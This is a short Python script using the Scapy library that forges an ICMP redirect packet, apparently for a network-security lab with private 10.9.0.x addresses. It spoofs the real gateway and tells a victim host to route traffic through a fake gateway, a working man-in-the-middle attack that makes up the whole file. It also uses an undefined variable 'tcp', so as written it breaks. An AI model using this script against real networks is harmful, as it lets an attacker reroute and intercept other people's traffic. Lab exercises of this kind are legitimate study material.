from scapy.all import *

victim = '10.9.0.5'
real_gateway = '10.9.0.11'
fake_gateway = '10.9.0.111'

ip = IP(src=real_gateway, dst=victim)
icmp = ICMP(type=5, code=1)
icmp.gw = fake_gateway

# The enclosed IP packet should be the one that triggers the redirect message.
ip2 = IP(src=victim, dst='8.8.8.8')
pkt = ip / icmp / ip2 / tcp

send(pkt)